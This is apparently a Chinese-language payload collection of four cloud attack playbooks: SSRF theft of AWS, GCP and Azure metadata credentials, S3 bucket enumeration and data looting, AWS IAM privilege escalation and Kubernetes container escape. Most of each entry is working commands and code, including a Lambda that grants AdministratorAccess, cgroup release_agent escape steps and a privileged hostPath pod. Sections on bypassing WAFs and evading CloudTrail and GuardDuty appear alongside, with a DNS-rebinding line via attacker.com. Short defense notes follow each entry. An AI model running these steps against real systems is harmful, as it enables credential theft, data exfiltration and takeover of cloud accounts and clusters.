# 云安全漏洞

_4 条 web payload_

### 云SSRF窃取元数据凭据  `cloud-ssrf-metadata`
_利用SSRF漏洞访问云服务(AWS/GCP/Azure)的实例元数据服务(IMDS)获取临时IAM凭据。攻击者可通过获取的Access Key接管云资源，实现从Web漏洞到云环境的横向升级。_
子类：**IMDS攻击** · tags: `云安全` `SSRF` `AWS` `GCP` `Azure` `IMDS` `元数据`

**前置条件：**
- 目标运行在云环境
- 存在SSRF漏洞
- 实例绑定了IAM角色

**攻击链：**

**1. AWS元数据服务探测**
> 通过SSRF访问AWS EC2实例元数据服务获取IAM临时凭据
```
# IMDSv1——无需特殊Header
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# 获取IAM角色名
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取临时凭据
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# 获取用户数据(可能包含启动脚本中的密钥)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```
**语法解析：**
- `169.254.169.254` — AWS/GCP/Azure通用的IMDS地址(Link-Local) _domain_
- `/latest/meta-data/` — AWS元数据API根路径 _path_
- `/iam/security-credentials/` — IAM角色临时凭据端点 _path_
- `/latest/user-data` — 实例用户数据——可能包含硬编码密钥 _path_

**2. GCP/Azure元数据利用**
> 获取GCP和Azure云环境的元数据凭据和管理令牌
```
# GCP元数据——需要Metadata-Flavor头
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP获取项目信息
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure管理令牌
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```
**语法解析：**
- `metadata.google.internal` — GCP元数据服务内部域名 _domain_
- `Metadata-Flavor: Google` — GCP强制要求的Header(防SSRF) _header_
- `Metadata: true` — Azure强制要求的Header _header_
- `/identity/oauth2/token` — Azure托管身份令牌端点 _path_

**3. 利用获取的凭据横向移动**
> 使用窃取的云凭据通过AWS CLI枚举云资源和权限
```
# 配置AWS CLI使用窃取的凭据
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# 枚举权限
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# 列举S3桶
aws s3 ls

# 枚举EC2实例
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```
**语法解析：**
- `AWS_ACCESS_KEY_ID` — AWS访问密钥ID环境变量 _variable_
- `sts get-caller-identity` — 验证当前身份和账号信息 _command_
- `s3 ls` — 列举所有可访问的S3存储桶 _command_
- `--query` — JMESPath查询过滤输出 _parameter_

**4. 深度利用——S3数据泄露/权限提升**
> 利用获取的云凭据导出S3数据、检查IAM提权可能性和提取密钥
```
# S3桶数据下载
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# 检查是否可以提权
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# 检查Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```
**语法解析：**
- `s3 sync` — 批量下载S3桶中的文件 _command_
- `create-access-key` — 为其他用户创建永久访问密钥(提权) _command_
- `secretsmanager get-secret-value` — 读取Secrets Manager中的敏感信息 _command_

**WAF/EDR 绕过变体：**

**绕过SSRF的IMDS防护**
> 通过IP变形、DNS重绑定和协议走私绕过SSRF对IMDS地址的过滤
```
# IMDSv2需要PUT获取Token——尝试Header注入
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP变形
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS重绑定
http://169-254-169-254.attacker.com  # 解析到169.254.169.254

# 协议走私
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```
**语法解析：**
- `0xa9fea9fe` — 169.254.169.254的十六进制表示 _encoding_
- `::ffff:169.254.169.254` — IPv6映射地址绕过IPv4过滤 _encoding_
- `gopher://` — Gopher协议走私HTTP请求 _technique_
- `nip.io` — 动态DNS服务——域名解析到对应IP _domain_


**概述：** 云SSRF窃取元数据凭据是近年来最具影响力的攻击面之一。2019年Capital One数据泄露事件(影响1亿+用户)正是通过SSRF访问AWS IMDS获取IAM凭据实现的。云实例的元数据服务(169.254.169.254)提供临时凭据、用户数据、网络配置等敏感信息。一旦Web应用存在SSRF漏洞，攻击者可直接从Web层穿透到云基础设施层。

**漏洞原理：** 漏洞根因：(1)AWS IMDSv1不需要任何认证即可访问(仅限实例内部网络)；(2)Web应用存在SSRF漏洞允许请求内网地址；(3)EC2实例绑定了权限过大的IAM角色(违反最小权限)；(4)用户数据(user-data)中硬编码了密钥/密码；(5)即使启用IMDSv2(需要PUT获取Token)，某些SSRF场景(如Header注入)仍可绕过；(6)GCP和Azure的Header防护在某些SSRF类型中可被绕过。

**利用方法：** 攻击链：(1)发现SSRF漏洞(URL参数、Webhook、文件导入等入口)；(2)请求http://169.254.169.254/latest/meta-data/确认云环境；(3)获取IAM角色名：/iam/security-credentials/；(4)获取临时凭据(AccessKeyId+SecretAccessKey+Token)；(5)使用AWS CLI配置凭据并枚举权限；(6)根据权限进行S3数据导出、密钥提取、IAM提权或EC2实例接管。

**防御措施：** 防御措施：(1)强制启用IMDSv2(aws ec2 modify-instance-metadata-options --http-tokens required)；(2)修复SSRF漏洞：URL白名单/禁止内网地址；(3)IAM角色最小权限原则；(4)使用VPC终端节点限制IMDS访问；(5)启用GuardDuty检测异常API调用；(6)不在user-data中存储敏感信息；(7)使用IMDSv2的hop limit=1限制容器穿透。

---

### S3存储桶配置错误利用  `cloud-s3-misconfig`
_利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。_
子类：**S3安全** · tags: `云安全` `S3` `AWS` `配置错误` `数据泄露`

**前置条件：**
- 已知目标S3桶名
- AWS CLI或HTTP访问

**攻击链：**

**1. S3桶名枚举**
> 通过域名变体、DNS记录和前端代码发现目标S3存储桶
```
# 基于域名猜测桶名
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME检查
dig +short CNAME {TARGET} | grep s3

# 从前端资源URL发现
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```
**语法解析：**
- `--no-sign-request` — 不使用AWS凭据——测试匿名访问 _parameter_
- `.s3.amazonaws.com` — S3桶的标准URL格式 _domain_
- `CNAME` — 检查域名是否指向S3桶 _keyword_

**2. 权限枚举**
> 测试S3桶的匿名列举、读取、写入权限和策略配置
```
# 测试列举权限
aws s3 ls "s3://{BUCKET}" --no-sign-request

# 测试读取权限
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# 测试写入权限
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# 检查Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# 检查ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```
**语法解析：**
- `get-bucket-policy` — 获取桶策略文档(定义了谁能做什么) _command_
- `get-bucket-acl` — 获取桶访问控制列表 _command_
- `s3 cp` — S3文件复制命令 _command_

**3. 敏感数据搜索**
> 枚举桶中所有文件并定向搜索下载敏感文件
```
# 递归列举所有文件
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# 搜索敏感文件
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# 下载关键文件
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# 搜索备份数据库
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```
**语法解析：**
- `--recursive` — 递归列举所有子目录 _parameter_
- `.sql|.bak|.env|.key|.pem` — 常见敏感文件扩展名 _technique_
- `--include "*$ext"` — 仅下载匹配特定后缀的文件 _parameter_

**4. 验证利用（静态网站篡改/XSS）**
> 测试S3网站桶的写入权限并验证是否可托管自定义HTML(可导致XSS/篡改)
```
# 如果桶托管了静态网站且可写
# 检查是否为网站桶
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# 上传XSS测试页面(无害)
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# 验证是否可访问
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# 清理测试文件
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```
**语法解析：**
- `get-bucket-website` — 检查桶是否配置为静态网站托管 _command_
- `--content-type "text/html"` — 设置MIME类型确保浏览器渲染HTML _parameter_

**WAF/EDR 绕过变体：**

**绕过S3访问限制**
> 通过区域端点变换、路径格式和已认证用户组绕过S3访问限制
```
# 使用不同区域端点
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# 使用路径格式(可能绕过某些WAF)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# 使用已认证但不同账号的AWS凭据
# (某些桶策略允许"AuthenticatedUsers"组)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Signed URL泄露搜索
# 在Google/GitHub搜索: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```
**语法解析：**
- `s3.{REGION}.amazonaws.com` — 区域特定的S3端点 _domain_
- `AuthenticatedUsers` — AWS预定义组——任何已认证的AWS用户 _concept_
- `X-Amz-Signature` — S3预签名URL的签名参数 _header_


**概述：** S3存储桶配置错误是云安全中最常见的漏洞之一。据统计，约5-10%的S3桶存在某种形式的公开访问配置错误。历史上多次重大数据泄露事件(如NSA承包商、Twitch源码、Facebook用户数据)都涉及S3配置不当。攻击者通过桶名枚举、DNS分析和前端代码审计发现目标桶后，可能获取数据库备份、API密钥、用户PII等敏感资产。

**漏洞原理：** 漏洞根因：(1)S3桶默认公开访问(2023年后AWS已默认阻止，但旧桶未迁移)；(2)桶策略使用了Principal:"*"(允许匿名)或"AWS":"*"(允许任意AWS用户)；(3)ACL配置了AllUsers或AuthenticatedUsers组的READ/WRITE权限；(4)开发者为方便将备份/日志桶设为公开但忘记关闭；(5)桶名可预测(如company-backup, company-prod-data)；(6)预签名URL泄露在代码或日志中。

**利用方法：** 攻击流程：(1)通过域名变体生成桶名候选列表；(2)使用aws s3 ls --no-sign-request批量检测匿名访问；(3)发现可列举的桶后枚举所有文件，重点关注.sql/.bak/.env/.key/.pem等后缀；(4)下载敏感文件并搜索凭据信息；(5)如果桶可写且托管了静态网站，可上传HTML/JS实现存储型XSS或网站篡改；(6)获取的AWS凭据可进一步用于云环境横向移动。

**防御措施：** 防御措施：(1)启用S3 Block Public Access(账号级别+桶级别)；(2)审计现有桶的ACL和Policy，移除Principal:"*"；(3)使用AWS Config规则持续监控S3配置变更；(4)S3桶名使用随机前缀防止枚举；(5)启用S3 Access Logging和CloudTrail审计访问日志；(6)敏感桶启用SSE-KMS加密和VPC端点限制访问来源。

---

### AWS IAM权限提升  `cloud-iam-escalation`
_在已获取低权限AWS凭据后，利用IAM策略中的过度授权(如iam:PassRole、lambda:CreateFunction等)实现权限提升至管理员。涵盖20+种已知的AWS IAM提权路径。_
子类：**IAM提权** · tags: `云安全` `AWS` `IAM` `权限提升` `Privilege Escalation`

**前置条件：**
- 已获取AWS凭据
- IAM策略存在过度授权

**攻击链：**

**1. 枚举当前权限**
> 枚举当前IAM身份的所有权限和策略
```
# 基础身份信息
aws sts get-caller-identity

# 枚举当前用户的策略
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# 获取策略详情
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# 使用enumerate-iam工具自动化
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```
**语法解析：**
- `get-caller-identity` — 获取当前调用者的ARN和账号ID _command_
- `list-attached-user-policies` — 列出用户关联的托管策略 _command_
- `.PolicyVersion.Document` — jq提取策略文档中的权限定义 _function_

**2. iam:PassRole + Lambda提权**
> 利用iam:PassRole和lambda:CreateFunction创建使用高权限角色的Lambda函数实现提权
```
# 创建恶意Lambda函数(需要iam:PassRole + lambda:CreateFunction)

# 创建Lambda代码
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # 为当前用户附加管理员策略
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# 创建Lambda并关联高权限角色
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# 触发执行
aws lambda invoke --function-name security-test /tmp/output.json
```
**语法解析：**
- `iam:PassRole` — 将IAM角色传递给其他服务的权限——提权核心 _keyword_
- `attach_user_policy` — 为用户附加策略——Lambda中使用高权限角色执行 _function_
- `AdministratorAccess` — AWS内置管理员策略——全部权限 _value_

**3. 其他提权路径**
> 展示多条IAM提权路径：策略版本覆盖、密钥创建和角色信任策略修改
```
# 路径1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 路径2: iam:CreateAccessKey (为其他用户创建密钥)
aws iam create-access-key --user-name admin

# 路径3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```
**语法解析：**
- `create-policy-version` — 创建新策略版本——覆盖原有权限定义 _command_
- `"Action":"*","Resource":"*"` — 全部权限策略——等同于管理员 _json_
- `update-assume-role-policy` — 修改角色信任策略——允许自己AssumeRole _command_

**4. 自动化提权工具**
> 使用PACU、pmapper和cloudfox自动化发现和利用IAM提权路径
```
# PACU——AWS渗透测试框架
python3 pacu.py
# 在PACU中:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper——IAM策略可视化和提权路径分析
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox枚举
cloudfox aws --profile target all-checks
```
**语法解析：**
- `pacu` — Rhino Security Labs的AWS利用框架 _command_
- `iam__privesc_scan` — PACU的IAM提权扫描模块 _command_
- `pmapper` — IAM策略图分析工具 _command_
- `cloudfox` — Bishop Fox的云安全枚举工具 _command_

**WAF/EDR 绕过变体：**

**绕过CloudTrail和GuardDuty检测**
> 通过使用非标准区域、低速操作和会话令牌降低被检测的风险
```
# 使用非标准区域(可能未开启CloudTrail)
aws iam list-users --region af-south-1

# 低速操作避免触发异常检测
sleep $((RANDOM % 60 + 30))  # 30-90秒随机延迟

# 使用AWS服务间调用减少直接API日志
# 通过Lambda/SSM间接执行而非直接CLI调用

# 使用Session Token而非长期凭据
aws sts get-session-token --duration-seconds 3600
```
**语法解析：**
- `af-south-1` — 非洲区域——可能未配置完整的CloudTrail _value_
- `get-session-token` — 获取临时会话令牌减少长期凭据暴露 _command_


**概述：** AWS IAM权限提升是云渗透测试的核心技能。研究表明，大量AWS环境中存在由IAM策略配置不当导致的提权路径。Rhino Security Labs整理了20+种已知的IAM提权方法，涵盖PassRole、策略版本覆盖、角色劫持等多种场景。攻击者获取低权限凭据后(如通过SSRF/代码泄露)，可利用这些路径提升为管理员权限。

**漏洞原理：** 漏洞根因：(1)IAM策略使用通配符(如iam:*)授予了过多权限；(2)iam:PassRole未限制可传递的角色范围；(3)IAM策略版本管理允许低权限用户创建新版本覆盖原有限制；(4)AssumeRole的信任策略配置过于宽松；(5)多个低危权限组合后可形成提权链(如创建Lambda+PassRole=管理员)；(6)缺乏持续的IAM权限审计和最小权限实践。

**利用方法：** 提权流程：(1)使用enumerate-iam或PACU枚举当前用户所有有效权限；(2)对照已知提权路径列表检查是否存在可利用的权限组合；(3)最常见路径：PassRole+CreateFunction(Lambda)/CreateEC2/CreateGlueJob；(4)策略类路径：CreatePolicyVersion/PutUserPolicy/AttachUserPolicy；(5)凭据类路径：CreateAccessKey/CreateLoginProfile/UpdateLoginProfile；(6)执行提权操作后用get-caller-identity确认权限变更。

**防御措施：** 防御措施：(1)实施IAM最小权限原则——使用IAM Access Analyzer识别和删除多余权限；(2)限制iam:PassRole的Resource为特定角色ARN而非*；(3)使用SCP(服务控制策略)在组织级别阻止高危操作；(4)启用IAM Credential Report定期审计；(5)使用AWS Config规则持续检测高危IAM配置；(6)实施MFA强制和会话策略限制。

---

### Kubernetes容器逃逸  `cloud-k8s-escape`
_在已获取Kubernetes Pod Shell的前提下，利用配置错误(特权容器、挂载宿主机路径、ServiceAccount高权限)实现容器逃逸，进而控制宿主机或整个Kubernetes集群。_
子类：**容器安全** · tags: `云安全` `Kubernetes` `容器逃逸` `Docker` `特权容器`

**前置条件：**
- 已获取Pod内Shell
- Pod存在配置错误

**攻击链：**

**1. 容器环境侦察**
> 确认容器环境并检查特权模式、SA令牌和内核能力
```
# 确认在容器中
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# 检查ServiceAccount令牌
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查特权模式
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```
**语法解析：**
- `/proc/1/cgroup` — cgroup路径判断是否在容器中 _path_
- `/.dockerenv` — Docker容器标志文件 _path_
- `serviceaccount/token` — K8s自动挂载的SA JWT令牌 _path_
- `capsh --print` — 查看Linux Capabilities(内核能力) _command_

**2. 特权容器逃逸**
> 利用特权容器的磁盘挂载和cgroup release_agent实现宿主机命令执行
```
# 方法1：挂载宿主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法2：通过cgroup逃逸(CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```
**语法解析：**
- `mount /dev/sda1` — 挂载宿主机磁盘——特权容器可直接访问设备 _command_
- `chroot` — 切换根目录到宿主机文件系统 _command_
- `release_agent` — cgroup的release_agent在宿主机上下文中执行 _keyword_
- `notify_on_release` — 启用cgroup释放通知触发release_agent _keyword_

**3. 利用ServiceAccount接管集群**
> 利用Pod中的ServiceAccount令牌通过K8s API枚举权限和获取集群Secrets
```
# 读取SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 枚举权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# 列出所有Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# 列出Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```
**语法解析：**
- `KUBERNETES_SERVICE_HOST` — K8s自动注入的API Server地址 _variable_
- `SelfSubjectAccessReview` — K8s权限自检API _keyword_
- `/api/v1/secrets` — K8s Secrets API——可能包含其他服务凭据 _path_

**4. 创建特权Pod反弹Shell**
> 创建挂载宿主机根目录的特权Pod实现容器逃逸
```
# 如果SA有create pods权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```
**语法解析：**
- `"privileged": true` — 特权容器——拥有宿主机全部Linux Capabilities _json_
- `"hostPath": {"path": "/"}` — 挂载宿主机根目录到容器内 _json_
- `security-test-pod` — 使用无害名称(非hack) _value_

**WAF/EDR 绕过变体：**

**绕过PodSecurityPolicy/OPA**
> 通过切换命名空间、使用临时容器和CronJob绕过Pod安全策略
```
# 使用非default命名空间(可能未应用PSP)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# 使用ephemeral容器(可能绕过PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# 使用CronJob而非Pod(某些策略不覆盖)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```
**语法解析：**
- `ephemeralContainers` — K8s临时容器——调试特性可能绕过安全策略 _keyword_
- `CronJob` — 定时任务资源——某些PSP未覆盖此资源类型 _keyword_


**概述：** Kubernetes容器逃逸是云原生环境中最严重的安全威胁之一。当攻击者通过Web漏洞(如RCE/SSRF)获取Pod内的Shell后，如果Pod存在配置错误(特权容器、hostPath挂载、高权限ServiceAccount)，攻击者可逃逸到宿主机并进一步接管整个K8s集群。MITRE ATT&CK for Containers框架详细描述了容器环境的攻击矩阵。

**漏洞原理：** 漏洞根因：(1)Pod以privileged:true运行(拥有全部Linux capabilities)；(2)挂载了宿主机路径(hostPath)如/、/var/run/docker.sock、/proc等；(3)ServiceAccount绑定了cluster-admin或过度权限；(4)未启用PodSecurityPolicy/PodSecurityStandard限制；(5)K8s API Server未启用RBAC或配置了过宽的ClusterRoleBinding；(6)容器使用root用户运行。

**利用方法：** 攻击路径：(1)通过Web RCE获取Pod Shell后先确认容器环境(cgroup/dockerenv)；(2)检查是否为特权容器(尝试mount/fdisk/capsh)——是则直接挂载宿主机磁盘逃逸；(3)检查ServiceAccount权限——如有create pods则创建特权Pod逃逸；(4)如有list secrets则获取集群内所有密钥；(5)如果SA权限不足，检查是否挂载了docker.sock(可创建特权容器)；(6)利用宿主机访问进一步控制整个K8s集群。

**防御措施：** 防御措施：(1)启用PodSecurityStandard(restricted级别)禁止特权容器；(2)禁止hostPath挂载，使用PV/PVC管理存储；(3)ServiceAccount最小权限——禁止automountServiceAccountToken除非需要；(4)使用NetworkPolicy限制Pod网络访问；(5)部署Falco等运行时安全工具检测异常行为；(6)使用seccomp/AppArmor/SELinux限制容器系统调用；(7)不要以root运行容器(runAsNonRoot:true)。

---
